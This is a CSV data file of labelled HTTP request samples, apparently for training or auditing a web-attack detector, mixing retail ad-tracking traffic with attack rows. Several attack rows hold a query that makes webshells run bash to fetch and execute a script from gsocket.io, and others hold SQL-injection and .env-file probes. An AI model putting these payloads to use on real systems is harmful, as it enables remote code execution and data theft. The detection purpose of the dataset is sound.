"hash_type","hash","rows","labels","sources","notes","sample_ids","sample_method","sample_path","sample_query"
"payload_family_hash","8541fe6ed90cf150f88eeb4d","4","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_002188|pos_owasp_modsec_002785|pos_owasp_modsec_000073|pos_owasp_modsec_000987","POST","/wp-login.php","action=lostpassword"
"payload_family_hash","8565bd2c3a03ac5cf4c78b3b","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000373|norm_modsec_learn_000368|norm_modsec_learn_000372|norm_modsec_learn_000359","GET","/","random=1663662044014&cv=9&fst=1663660800000&num=1&bg=ffffff&hl=EN&guid=ON&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa9j0&sendb=1&data=event%3Dpage_view%3BloggedIn%3D(not%20set)%3BcustomerType%3DCONS%3BpageType-hit%3DSales%3BpageType-session%3"
"payload_family_hash","8798446070c7e203a0a627ea","4","0","openappsec_legitimate","normal","norm_legitimate_001320|norm_legitimate_001280|norm_legitimate_001282|norm_legitimate_001318","GET","/td/rul/986797384","random=1719747638156&cv=11&fst=1719747638156&fmt=3&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html%3FforceSelSize%3D6.5&ref=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgran"
"payload_family_hash","89fb6a554ccd21306ad7372e","4","0","openappsec_legitimate","normal","norm_legitimate_000916|norm_legitimate_000953|norm_legitimate_000922|norm_legitimate_000948","GET","/privacy_sandbox/pixel/register/trigger/","id=3122845081335855&ev=PageView&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&rl=&if=false&ts=1719747572440&cd[page_type]=GLP&cd[page_name]=KIDS&cd[previous_page_name]=GLP%7CKIDS&cd[page_visited]=3&sw=1920&sh=1080&v=2.9.159&r=stable&a=tmtealium&ec=0&o=4125&fbp=fb.1.1719747521101.433041328924284676&ler"
"payload_family_hash","8ff4142b9b4f17a52a6efe8e","4","0","openappsec_legitimate","normal","norm_legitimate_002384|norm_legitimate_002367|norm_legitimate_002374|norm_legitimate_002381","POST","/af",""
"payload_family_hash","91ea07e10f270cff0ce63944","4","1","csic_2010","csic_anomalous","pos_csic_002420|pos_csic_002852|pos_csic_000754|pos_csic_000425","GET","/tienda1/asf-logo-wide.gif",""
"payload_family_hash","925bf0de5f43e20dac0e80f5","4","1","owasp_modsecurity","owasp_sqli:932115|owasp_sqli:942100","pos_owasp_modsec_001757|pos_owasp_modsec_000019|pos_owasp_modsec_001934|pos_owasp_modsec_001588","POST","/wp-login.php","reauth=1&redirect_to=https://df7754e.hu/wp-admin/"
"payload_family_hash","9261ba70afe0530c12c52c46","4","0","openappsec_legitimate","normal","norm_legitimate_000810|norm_legitimate_001261|norm_legitimate_001064|norm_legitimate_001421","GET","/track","action=pageView&env=js-web&tag_version=6.18.0_524f5eb&provider=tag&advertiser_id=10786&referer=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&user_session_id=5f891efa-1fa1-4c15-a7b6-84b601a599dc"
"payload_family_hash","9774043cebf1f3fdf5f5dbb5","4","0","openappsec_legitimate","normal","norm_legitimate_002958|norm_legitimate_002876|norm_legitimate_002908|norm_legitimate_002838","GET","/openservice/gatewayService","modelId=10813&categoryIds=44&_=1728488100915&callback=axiosJsonpCallback2"
"payload_family_hash","984b6dfdb79deff6b9d9a1c8","4","0","openappsec_legitimate","normal","norm_legitimate_001281|norm_legitimate_001329|norm_legitimate_001279|norm_legitimate_001335","GET","/pagead/viewthroughconversion/986797384/","random=1719747632434&cv=11&fst=1719747632434&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Frunfalcon-5-running-shoes%2FIH7760.html&ref=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID"
"payload_family_hash","9acb353ba7b3c7f6a898c54b","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_001773|pos_owasp_modsec_002923|pos_owasp_modsec_002609|pos_owasp_modsec_001141","GET","/d_44424c43/d_e6bf6bfb/d_253a0127/d_f82440d4/d_628ea0d7/block_rce.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","9af99b42ab194a98fd63497d","4","1","owasp_modsecurity","owasp_xss:920450","pos_owasp_modsec_000836|pos_owasp_modsec_001998|pos_owasp_modsec_002148|pos_owasp_modsec_001717","GET","/d_aef1eb87/d_26833b49/d_69e31438/d_7f42b05b/pum-site-scripts.js",""
"payload_family_hash","a465aec0a9cf7eb05b512e1b","4","0","openappsec_legitimate","normal","norm_legitimate_001956|norm_legitimate_001954|norm_legitimate_001957|norm_legitimate_001955","GET","/web-data-ingress","cd1=us%3Adesktop%3AChrome_129&cd5=AE%3As%3Aae_strigid_mom_jean%3Aui&cd6=AE&cd38=prod&cd40=01926078809e00696d23e4b265b005075001806d0093c&cid=GA1.2.675159792.1728195365&dl=https%3A%2F%2Fwww.ae.com%2Fus%2Fen%2Fs%2Fae%2Bstrigid%2Bmom%2Bjean%3Fbrand%3DAE%26color%3Dblue%252CGrey%26gender%3DWomen%26price%3"
"payload_family_hash","a7666b1d24e8bdf935be6cbd","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000374|norm_modsec_learn_000366|norm_modsec_learn_000365|norm_modsec_learn_000362","GET","/","random=1663662044099&cv=9&fst=1663662044099&num=1&bg=ffffff&hl=EN&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=3&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&gtm=2oa9j0&sendb=1&ig=1&data=event%3Dview_item%3BloggedIn%3D(not%20set)%3BcustomerType%3DCONS%3BflowCode%3DDSU"
"payload_family_hash","a9547d770948b000f3336737","4","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_001614|pos_owasp_modsec_001146|pos_owasp_modsec_000345|pos_owasp_modsec_000535","GET","/apps/.env",""
"payload_family_hash","b6846e2572657e4371795c86","4","1","owasp_modsecurity","owasp_sqli:942100","pos_owasp_modsec_002574|pos_owasp_modsec_001027|pos_owasp_modsec_001467|pos_owasp_modsec_000636","POST","/","wc-ajax=aws_action"
"payload_family_hash","b75d813e8e089c74ab5a3e3b","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002937|pos_owasp_modsec_001783|pos_owasp_modsec_001307|pos_owasp_modsec_002419","GET","/d_eda37985/d_3487ae30/mod_webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","bd880023912b5bc2ab9612f6","4","0","openappsec_legitimate","normal","norm_legitimate_001017|norm_legitimate_001132|norm_legitimate_001153|norm_legitimate_001031","GET","/tr/","id=3122845081335855&ev=ViewContent&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html&rl=&if=false&ts=1719747599573&cd[content_category]=%5B%22SHOES%22%5D&cd[content_ids]=%5B%22ID0741%22%5D&cd[content_name]=%5B%22GRAND%20COURT%202.0%20SHOES%20KIDS%22%5D&cd[content_type]="
"payload_family_hash","bf6efd1afed88d6b3f51e5ec","4","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_002390|pos_owasp_modsec_000142|pos_owasp_modsec_002613|pos_owasp_modsec_001893","GET","/d_44424c43/d_42a4d7a0/d_3e6ca509/webshell.php","action=exec&cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","bfa516cfe72cfb1799663f97","4","1","csic_2010","csic_anomalous","pos_csic_000178|pos_csic_000357|pos_csic_002316|pos_csic_002670","POST","/tienda1/publico/anadir.jsp",""
"payload_family_hash","c09fb9dfc43e4389e94d445b","4","0","openappsec_legitimate","normal","norm_legitimate_001713|norm_legitimate_001742|norm_legitimate_001725|norm_legitimate_001760","POST","/collector/tp2",""
"payload_family_hash","c123bd7fea1c4429b705ef5c","4","1","csic_2010","csic_anomalous","pos_csic_000672|pos_csic_000374|pos_csic_001585|pos_csic_001534","GET","/tienda1/publico/anadir.jsp","id=3&nombre=Queso+Manchego&precio=39&cantidad=33&B1A=A%F1adir+al+carrito"
"payload_family_hash","c51657a3c4527cfe5a2db348","4","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002337|norm_modsec_learn_002341|norm_modsec_learn_002340|norm_modsec_learn_002338","GET","/","T=B&u=https%3A%2F%2Fwww.t-mobile.com%2Fservices&t=1663681677016&v=1663681681743&H=d6ab6b13108e7a6275cc2236&s=338e6b6523e2e777f09c4d0a4f489cc3&z=1&Q=2&S=2764&N=3"
"payload_family_hash","c5f1f26a60e08d2c91150cee","4","0","openappsec_legitimate","normal","norm_legitimate_001001|norm_legitimate_001398|norm_legitimate_000860|norm_legitimate_001226","GET","/WRSiteInterceptEngine/","Q_ZID=ZN_6McRij6XnCfajoF&Q_LOC=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html"
"payload_family_hash","caa64db9e4b9ac9c646dbf43","4","0","openappsec_legitimate","normal","norm_legitimate_000168|norm_legitimate_000165|norm_legitimate_000167|norm_legitimate_000166","POST","/web/acc/registry",""
"payload_family_hash","dbc9a30f84c40e63964ea05a","4","0","openappsec_legitimate","normal","norm_legitimate_001712|norm_legitimate_001741|norm_legitimate_001759|norm_legitimate_001724","POST","/collector/tp2",""
"payload_family_hash","e0c1a205d43fa40b65125217","4","0","openappsec_legitimate","normal","norm_legitimate_001039|norm_legitimate_001036|norm_legitimate_001037|norm_legitimate_001042","GET","/pagead/viewthroughconversion/986797384/","random=1719747600365&cv=11&fst=1719747600365&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html&top=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FI"
"payload_family_hash","e34d512f31bf83bf79966ee6","4","1","owasp_modsecurity","owasp_lfi_rfi:930130|owasp_xss:930130","pos_owasp_modsec_002456|pos_owasp_modsec_000306|pos_owasp_modsec_002515|pos_owasp_modsec_000110","GET","/.env.example",""
"payload_family_hash","e3730b1af27dbffa0532b6d1","4","0","openappsec_legitimate","normal","norm_legitimate_001165|norm_legitimate_001135|norm_legitimate_001032|norm_legitimate_001018","GET","/privacy_sandbox/pixel/register/trigger/","id=680435655455279&ev=ViewContent&dl=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html%3FforceSelSize%3D5K&rl=&if=false&ts=1719747607655&cd[content_category]=%5B%22SHOES%22%5D&cd[content_ids]=%5B%22ID0741%22%5D&cd[content_name]=%5B%22GRAND%20COURT%202.0%20SHOES%20KIDS%22%5"
"payload_family_hash","e4610a208180a0dbd56751b9","4","0","openappsec_legitimate","normal","norm_legitimate_001746|norm_legitimate_001736|norm_legitimate_001716|norm_legitimate_001764","POST","/collector/tp2",""
"payload_family_hash","e5c84b4930453ca5d147d4d2","4","0","openappsec_legitimate","normal","norm_legitimate_001761|norm_legitimate_001714|norm_legitimate_001726|norm_legitimate_001743","POST","/collector/tp2",""
"payload_family_hash","eb88f3929a283c8d1b2284cb","4","0","openappsec_legitimate","normal","norm_legitimate_001046|norm_legitimate_001030|norm_legitimate_001088|norm_legitimate_001035","GET","/td/rul/986797384","random=1719747600354&cv=11&fst=1719747600354&fmt=3&bg=ffffff&guid=ON&async=1&gtm=45be46q0v9176148604za200&gcd=13t3t3t3t5&dma=0&tag_exp=0&u_w=1920&u_h=1080&url=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-kids%2FID0741.html&top=https%3A%2F%2Fwww.adidas.com%2Fus%2Fgrand-court-2.0-shoes-ki"
"payload_family_hash","f4f349d5feb8e497cd4e2c9d","4","0","openappsec_legitimate","normal","norm_legitimate_002900|norm_legitimate_002832|norm_legitimate_002945|norm_legitimate_002873","GET","/openservice/gatewayService","modelId=10739&split=1&_=1728488067335&callback=axiosJsonpCallback1"
"payload_family_hash","f927836a3a86913b18b13c33","4","1","csic_2010","csic_anomalous","pos_csic_002625|pos_csic_001734|pos_csic_000056|pos_csic_001429","POST","/tienda1/publico/pagar.jsp",""
"payload_family_hash","f9b5a50776fce1a9c12cd871","4","0","openappsec_legitimate","normal","norm_legitimate_001431|norm_legitimate_001289|norm_legitimate_001290|norm_legitimate_001067","GET","/horizon/adidasgroup","QUANTUM_WARNING=https%3A%2F%2Fwww.adidas.com%2Fus%2Fcheckout&hit=undefined&s=aa3bbc1a791d8c7348e559873f77a0d2&CORS_LINK=https%3A%2F%2Fx.klarnacdn.net%2Fonsite-messaging%2Ffonts%2Fv1.2%2Ffonts.css"
"payload_family_hash","0283343e2aabbe897aa748c5","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000258|pos_owasp_modsec_002413|pos_owasp_modsec_000728","GET","/d_eda37985/d_4ff6ca68/d_4ff6ca68/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
"payload_family_hash","074dac6ea578dbabd9cd09a9","3","1","owasp_modsecurity","owasp_xss:933110","pos_owasp_modsec_000375|pos_owasp_modsec_001074|pos_owasp_modsec_001353","POST","/d_21316fde/d_5737eae1/class-plugin-installer-skin-wp.php","beta=my-db.com/3"
"payload_family_hash","076ed5bbe73d22167061af24","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002874|norm_modsec_learn_002884|norm_modsec_learn_002885","GET","/","vc=1.1&vv=1.1&ctid=GTM-5T9932C&idx=18&event_name=gtm.scrollDepth&variable_name=dlv%20-%20ecommerce.impressions&channels=&tag_names=&dlKey=ecommerce.impressions&dlValue=undefined&cond=required&condValue=true&url=https%3A%2F%2Fstoryonline.co.il%2F50307793054%2Fcheckouts%2Fed1e420b608c33680a8a064206b62"
"payload_family_hash","0b0f43f21b182af5d49470d8","3","0","openappsec_legitimate","normal","norm_legitimate_001188|norm_legitimate_001439|norm_legitimate_001362","GET","/pagead/viewthroughconversion/787863515/","random=1657529315&cv=9&fst=1719747610541&num=1&npa=1&label=NGnbCMXG7cIBENuv1_cC&guid=ON&resp=GooglemKTybQhCsO&eid=375603260%2C466465925%2C512247839&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=6&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F4599367.fls.doublecli"
"payload_family_hash","11c38e5b29dd3d8e98098825","3","0","openappsec_legitimate","normal","norm_legitimate_002841|norm_legitimate_002840|norm_legitimate_002839","GET","/openservice/gatewayService","endpoint=pc&modelId=10741"
"payload_family_hash","134df170ce8d59b7c44fcdb4","3","0","openappsec_legitimate","normal","norm_legitimate_001358|norm_legitimate_001189|norm_legitimate_001187","GET","/pagead/viewthroughconversion/787863515/","random=741520289&cv=9&fst=1719747638420&num=1&npa=1&label=jn7ZCLbF98IBENuv1_cC&guid=ON&resp=GooglemKTybQhCsO&eid=375603261%2C466465926%2C512247838&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=8&u_tz=0&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F4599367.fls.doubleclic"
"payload_family_hash","1f0fba6b519bdd6b72b033f5","3","0","openappsec_legitimate","normal","norm_legitimate_001447|norm_legitimate_000815|norm_legitimate_001043","POST","/j/collect","t=dc&aip=1&_r=3&v=1&_v=j101&tid=UA-41273132-1&cid=259251594.1719747522&jid=1463631168&gjid=1466513189&_gid=1212856862.1719747522&_u=SCCAiAIJBAAAgGAMK~&z=261778207"
"payload_family_hash","20fa4116ce37376376fb2014","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001712|norm_modsec_learn_001070|norm_modsec_learn_002857","GET","/","v=2.2.2"
"payload_family_hash","22287659079a8281b356b835","3","1","csic_2010","csic_anomalous","pos_csic_001785|pos_csic_002062|pos_csic_001240","GET","/tienda1/publico/anadir.jsp","id=3&nombre=Queso+Manchego&precioA=100&cantidad=2&B1=A%F1adir+al+carrito"
"payload_family_hash","23f43de9bef5a68c5c4561c5","3","0","openappsec_legitimate","normal","norm_legitimate_001926|norm_legitimate_001930|norm_legitimate_001924","POST","/bulk",""
"payload_family_hash","246cfd7bc4e39249bd1ac810","3","0","openappsec_legitimate","normal","norm_legitimate_001148|norm_legitimate_001022|norm_legitimate_001099","GET","/v3/","event=PageVisit&ed=%7B%22currency%22%3A%22USD%22%2C%22page_title%22%3A%22adidas%20Grand%20Court%202.0%20Shoes%20Kids%20-%20White%20%7C%20Kids%27%20Lifestyle%20%7C%20adidas%20US%22%2C%22line_items%22%3A%5B%7B%22product_id%22%3A%22ID0741%22%2C%22product_name%22%3A%22GRAND%20COURT%202.0%20SHOES%20KIDS%"
"payload_family_hash","24b69e9c287fd5ec3edf80f6","3","0","openappsec_legitimate","normal","norm_legitimate_001973|norm_legitimate_002532|norm_legitimate_000671","POST","/log","format=json&hasfast=true"
"payload_family_hash","2a1d82118179f7b1259522a5","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002838|norm_modsec_learn_002263|norm_modsec_learn_002837","GET","/","v=11.40.1&sr=45&mdh=10531&pn=1&uu=7224a44c-b504-a41f-a016-377bd734aa09&sn=1&lv=1662453835&lhd=1662453835&hd=1662453835&pid=16000&str=25&di=595&dc=6381&fl=6393&ct=1&enc=lzstring"
"payload_family_hash","2a953a0b0974cec50d5f5bf9","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002339|norm_modsec_learn_002343|norm_modsec_learn_002342","GET","/","T=B&u=https%3A%2F%2Fwww.t-mobile.com%2Fservices&t=1663681677016&v=1663681689432&H=d6ab6b13108e7a6275cc2236&s=338e6b6523e2e777f09c4d0a4f489cc3&z=1&S=133742&N=345&P=10"
"payload_family_hash","2b4784c400ecf2666cff7d70","3","0","openappsec_legitimate","normal","norm_legitimate_001922|norm_legitimate_001858|norm_legitimate_001929","POST","/bulk",""
"payload_family_hash","306371728d9dc67af0d5b05b","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002583|norm_modsec_learn_002585|norm_modsec_learn_002584","GET","/","page-url=https%3A%2F%2Fauto.ru%2Fcars%2Fall%2F%3Fbody_type_group%3DHATCHBACK_3_DOORS%26body_type_group%3DHATCHBACK_5_DOORS%26body_type_group%3DLIFTBACK%26from%3Dold_guru&charset=utf-8&hittoken=PRESENT&browser-info=pa%3A1%3Aar%3A1%3Avf%3A2ofv6mafcjh9uxrt4ak4xk%3Afu%3A1%3Aen%3Autf-8%3Ala%3Aen-US%3Av%3"
"payload_family_hash","4246108d7666ee82d11c1ad4","3","0","openappsec_legitimate","normal","norm_legitimate_002327|norm_legitimate_002078|norm_legitimate_002148","GET","/idsync/ex/receive","partner_device_id=UserId%3Dbec89482-98ee-48c0-b8e9-96abf0494f9a&partner_id=2433&format=png&_rnd=0.21887133990852714"
"payload_family_hash","43378565ff8e0a2f87233406","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001223|norm_modsec_learn_001222|norm_modsec_learn_001224","GET","/","cors=true&content-type=application/x-json-stream&client-id=NO_AUTH&client-version=1DS-Web-JS-3.1.10&apikey=PRESENT&upload-time=1663168093724&ext.intweb.msfpc=GUID%3D4806b3f3c0494f39800284df7a2c9c77%26HASH%3D4806%26LV%3D202209%26V%3D4%26LU%3D1663167949970&w=0&anoncknm=anon"
"payload_family_hash","46fe4c6fdd2586785c91a556","3","0","openappsec_legitimate","normal","norm_legitimate_002565|norm_legitimate_002544|norm_legitimate_002573","POST","/tracking/jitney/logging/messages",""
"payload_family_hash","4a857bc58ccd57f609b408b8","3","1","csic_2010","csic_anomalous","pos_csic_001523|pos_csic_000117|pos_csic_001551","GET","/tienda1/publico/vaciar.jsp","B2=%2520"
"payload_family_hash","4d40cbc99156b2bca0bad288","3","0","openappsec_legitimate","normal","norm_legitimate_000436|norm_legitimate_000343|norm_legitimate_000345","POST","/shop/rb_bf61930lop","type=js3&sn=v_4_srv_20_sn_C0B7CD9BE67E5CB86AC651D7B933C649_perc_100000_ol_0_mul_1_app-3A59fcf8f3ef580f1f_1&svrid=20&flavor=post&vi=HNHKPCIDRBERMKMHCLDFFAFSHLTJCQLM-0&modifiedSince=1727802883945&rf=https%3A%2F%2Fwww.abercrombie.com%2Fshop%2Fwd%2Fwomens%3Ficmp%3DICT%3AHOL24%3AF-A%3AHP%3AT20%3ADIV%3ACA"
"payload_family_hash","4f9c78fcc0cebbfc2181a2aa","3","0","openappsec_legitimate","normal","norm_legitimate_001283|norm_legitimate_001140|norm_legitimate_001041","GET","/privacy-sandbox/register-conversion","_c=1&cid=259251594.1719747522&dbk=5084010919600693555&dma=0&en=view_item&gcs=G111&gtm=45je46q0v888916367za200&npa=0&tid=G-4DGGV4HV95&dl=https%3A%2F%2Fwww.adidas.com%3F"
"payload_family_hash","51702093161462c61c05dedf","3","0","openappsec_legitimate","normal","norm_legitimate_000910|norm_legitimate_000789|norm_legitimate_000962","GET","/track/up","adv=ygdrgdy&ref=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&upid=186z53b&upv=1.1.0&vf=USD&TD1=GLP|KIDS&TD9=&Geo=US&TD10=3&paapi=1"
"payload_family_hash","521c10d7d065e2e29ab85bca","3","1","csic_2010","csic_anomalous","pos_csic_000316|pos_csic_001062|pos_csic_000214","GET","/tienda1/publico/anadir.jsp","id=3&nombreA=Jam%F3n+Ib%E9rico&precio=39&cantidad=4&B1=A%F1adir+al+carrito"
"payload_family_hash","5495bd701042b772cc67f71c","3","0","openappsec_legitimate","normal","norm_legitimate_001995|norm_legitimate_001983|norm_legitimate_002126","POST","/api/cronos/seo/base",""
"payload_family_hash","5541047d2f7b7388b56d774c","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000430|norm_modsec_learn_000431|norm_modsec_learn_000432","GET","/","sections=messages&force_new_section_timestamp=true&_=1660559467289"
"payload_family_hash","56e763c6248418400b821571","3","0","openappsec_legitimate","normal","norm_legitimate_001024|norm_legitimate_000825|norm_legitimate_001448","GET","/td/ga/rul","tid=G-4DGGV4HV95&gacid=259251594.1719747522&gtm=45je46q0v888916367za200&dma=0&gcs=G111&gcd=13t3t3t3t5&npa=0&pscdl=&aip=1&fledge=1&frm=0&z=1439044768"
"payload_family_hash","57ef94e2bc7f3f708b3eac55","3","0","openappsec_legitimate","normal","norm_legitimate_000894|norm_legitimate_000728|norm_legitimate_000769","POST","/personalizationengine","sitePath=us"
"payload_family_hash","5d51e9b1403a498ae161690f","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001459|norm_modsec_learn_001551|norm_modsec_learn_001457","GET","/","random=1476625574&cv=9&fst=1660632364827&num=2&npa=1&label=YBewCJK_u-MCELm7psAC&guid=ON&resp=GooglemKTybQhCsO&eid=375603261&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=5&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&sendb=1&ig=1&frm=2&url=https%3A%2F%2F9731995.fls.doubleclick.net%2Factivityi%3Bd"
"payload_family_hash","5e4c7fd27d5bda54e51aa61d","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000329|norm_modsec_learn_000328|norm_modsec_learn_000390","GET","/","random=1660222063182&cv=9&fst=1660222063182&num=1&value=0&label=rbV_CPrguIIBEJKSrIAD&bg=ffffff&guid=ON&resp=GooglemKTybQhCsO&u_h=1080&u_w=1920&u_ah=1040&u_aw=1920&u_cd=24&u_his=1&u_tz=180&u_java=false&u_nplug=5&u_nmime=2&gtm=2wg880&sendb=1&ig=1&gclaw=CjwKCAjw0dKXBhBPEiwA2bmObXikHID0F9SgcorSLNyldJGR5"
"payload_family_hash","5f197ce75dc783eb4eb6c169","3","1","openappsec_malicious","sqli","pos_malicious_001342|pos_malicious_001793|pos_malicious_001335","GET","/","p=1%20uNIoN%28sEleCT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29"
"payload_family_hash","653f34536f0e39cf32f6956c","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_000708|norm_modsec_learn_000710|norm_modsec_learn_000709","GET","/","ct=1663167498894"
"payload_family_hash","68c78e430948a2a1e28df359","3","0","openappsec_legitimate","normal","norm_legitimate_000886|norm_legitimate_000942|norm_legitimate_001213","POST","/actionp/0","ti=5713812&Ver=2&mid=a8743289-478d-4e2d-9fe7-413595ab25e0&sid=51cd976036d511ef88680dd62cd4e68e&vid=51cde72036d511efb6de350517090e1b&vids=0&msclkid=N&evt=pageHide"
"payload_family_hash","69c808c9524065471dd60c18","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_002956|norm_modsec_learn_000835|norm_modsec_learn_000834","GET","/","key=PRESENT"
"payload_family_hash","6a25510bbe1b999378a6433b","3","0","modsec_learn_legitimate","modsec_learn_legitimate","norm_modsec_learn_001326|norm_modsec_learn_002496|norm_modsec_learn_001325","GET","/","id=19762596&secure&9223387"
"payload_family_hash","6a385577133ee587d4fe2ad4","3","0","openappsec_legitimate","normal","norm_legitimate_000968|norm_legitimate_000923|norm_legitimate_000808","GET","/action/0","ti=5713812&Ver=2&mid=fb5f9ccf-a07a-4b9a-b20d-fe6ee15fa022&sid=51cd976036d511ef88680dd62cd4e68e&vid=51cde72036d511efb6de350517090e1b&vids=0&msclkid=N&gc=USD&pagetype=other&p=https%3A%2F%2Fwww.adidas.com%2Fus%2Fkids&sw=1920&sh=1080&sc=24&evt=custom&rn=116816"
"payload_family_hash","6bce8e04bf08c483b3d3eb8f","3","1","csic_2010","csic_anomalous","pos_csic_000501|pos_csic_001323|pos_csic_002684","GET","/tienda1/publico/anadir.jsp","id=1&nombre=Vino+.*%3FRioja&precio=85&cantidad=22&B1=A%F1adir+al+carrito"
"payload_family_hash","6c02e377871c3fad293faecd","3","1","csic_2010","csic_anomalous","pos_csic_000240|pos_csic_002678|pos_csic_001231","GET","/tienda1/publico/caracteristicas.jsp","id=2%7C"
"payload_family_hash","6dc653267617aceca5c4df43","3","0","openappsec_legitimate","normal","norm_legitimate_000411|norm_legitimate_000404|norm_legitimate_000384","GET","/is/image/anf/KIC_155-4713-00030-278_sw","policy=product-xsmall"
"payload_family_hash","6f58c0f0da6271a767db5407","3","1","owasp_modsecurity","owasp_rce:932130","pos_owasp_modsec_000169|pos_owasp_modsec_001701|pos_owasp_modsec_001399","GET","/d_eda37985/d_4ed974d3/d_64c9c797/shell.php","cmd=bash%20-c%20%22$(curl%20-fsSL%20https://gsocket.io/y)%22"
